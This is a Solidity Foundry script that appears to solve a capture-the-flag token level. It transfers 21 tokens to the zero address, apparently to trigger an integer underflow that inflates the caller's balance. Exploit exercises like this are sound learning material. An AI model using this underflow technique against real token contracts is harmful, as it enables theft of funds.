// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Level6Token} from "../src/Level6Token.sol";
import {Script, console} from "forge-std/Script.sol";

contract Level6TokenSolv is Script {
    address token = 0x54d5630e4b55e065D2bCA0E65b3d6Ed862A5A4b4;
    Level6Token public tokenInstance = Level6Token(token);

    function run() external {
        vm.startBroadcast();
        console.log(tokenInstance.balanceOf(token));
        console.log(tokenInstance.balanceOf(tx.origin));
        tokenInstance.transfer(address(0), 21);
        console.log("My balance: ", tokenInstance.balanceOf(msg.sender));
        vm.stopBroadcast();
    }
}
